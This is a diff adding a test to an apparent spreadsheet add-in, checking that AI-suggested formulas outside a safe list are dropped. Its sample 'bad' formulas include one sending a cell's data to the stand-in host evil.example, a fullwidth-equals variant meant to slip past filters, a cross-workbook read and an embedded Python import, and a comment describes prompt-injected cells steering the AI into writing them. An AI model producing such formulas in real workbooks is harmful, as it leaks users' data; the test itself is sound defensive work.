@@ -154,6 +154,28 @@ def test_suggest_fix_drops_formulas_that_reach_outside_the_workbook(monkeypatch)
     assert "reached outside this workbook" in out["explanation"]
 
 
+def test_an_ai_formula_using_a_function_not_on_the_safe_list_is_left_out(monkeypatch):
+    # 2026-10-15 audit: the old blocklist let these through. Each one can send the sheet's data out, or read
+    # another workbook, after a prompt-injected cell talks the AI into it (the user still sees a preview).
+    bad = ['=IMPORTCSV("https:"&"//evil.example/?"&A2)', '=IMPORTTEXT("https:"&"//x/?"&A2)',
+           '=COPILOT("summarise", A2:C3)', '＝WEBSERVICE("https://x/?"&A2)', '=INDIRECT("[Other.xlsx]S!A1")',
+           '=STOCKHISTORY("MSFT",A2)', '=SUM(A2,PY("import os"))']
+    good = ['=SUM(C2:C3)', '=IFERROR(VLOOKUP(A2,A2:C3,3,FALSE),0)', '=ROUND(AVERAGEIFS(C2:C3,B2:B3,"East"),2)',
+            '=XLOOKUP(A2,A2:A3,C2:C3)', '=TEXT(DATE(2026,1,9),"yyyy-mm-dd")', '=_xlfn.XLOOKUP(A2,A2:A3,C2:C3)',
+            '-5', 'East (import)']
+    wide = COLS + ["D", "E"]
+    rows = [r + ["", ""] for r in ROWS] + [["2026-01-09", "East", 1, "", ""]] * 7
+    answer = {"explanation": "x", "changes": [{"cell": f"D{k + 2}", "new": f} for k, f in enumerate(bad)]
+              + [{"cell": f"E{k + 2}", "new": f} for k, f in enumerate(good)]}
+    srv, _ = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
+    try:
+        out = client.suggest_fix(wide, rows, 1, 0, 0, "", "")
+    finally:
+        srv.shutdown()
+    assert [c["cell"] for c in out["changes"]] == [f"E{k + 2}" for k in range(len(good))]
+    assert "not on this add-in's safe list" in out["explanation"]
+
+
 def test_engine_reason_wording_the_panel_reads():
     """panel/taskpane.js recommendFix parses these engine phrases - keep them in step."""
     c = create_app().test_client()
